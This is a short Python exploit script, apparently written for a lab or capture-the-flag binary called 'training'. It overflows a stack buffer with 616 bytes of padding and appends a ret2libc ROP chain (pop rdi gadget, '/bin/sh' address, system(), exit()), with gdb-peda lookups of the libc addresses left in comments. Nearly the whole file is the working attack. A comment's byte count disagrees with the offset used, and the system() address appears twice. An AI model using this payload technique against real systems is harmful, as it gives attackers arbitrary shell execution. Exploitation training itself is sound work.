#!/usr/bin/env python3

#from pwn import *
import sys

# WE can cause an overflow with 612 bytes + EIP
offset=616

# Let's choose local vs remote
#p = process("./training")
#p = remote("127.0.0.1", 4444)

#p.recvuntil("desert:")

# Payload: junk until the EIP overwrite
payload = b""
payload += b"\x90" * offset

#gdb-peda$ p system
#$4 = {int (const char *)} 0x7ffff7e0f330 <__libc_system>
#gdb-peda$ p exit
#$5 = {void (int)} 0x7ffff7e01590 <__GI_exit>
#gdb-peda$ find /bin/sh
#Searching for '/bin/sh' in: None ranges
#Found 1 results, display max 1 items:
#libc.so.6 : 0x7ffff7f59031 --> 0x68732f6e69622f ('/bin/sh')
# ropsearch "pop rdi" libcbae libcend
#0x00007ffff7df7999
# 0x00007ffff7df5089

pop_rdi=      (0x00007ffff7df7999)
addr_ret=     (0x0000000000401016)
addr_system = (0x00007ffff7e0f330)
addr_exit =   (0x00007ffff7e01590)
addr_binsh =  (0x00007ffff7f59031)
zero_arg =    (0x0000000000000000)


# pop rdi; ret
payload += b"\x99\x79\xdf\xf7\xff\x7f\x00\x00"

# "/bin/sh" address (argument for system() to be popped in rdi )
payload += b"\x31\x90\xf5\xf7\xff\x7f\x00\x00"

# additinal ret
payload += b"\x16\x10\x40\x00\x00\x00\x00\x00"

# System() address
payload += b"\x30\xf3\xe0\xf7\xff\x7f\x00\x00"
payload += b"\x30\xf3\xe0\xf7\xff\x7f\x00\x00"

# Exit
payload += b"\x90\x15\xe0\xf7\xff\x7f\x00\x00"

# 0x0000000 (argument for exit())
#payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"


sys.stdout.buffer.write(payload)

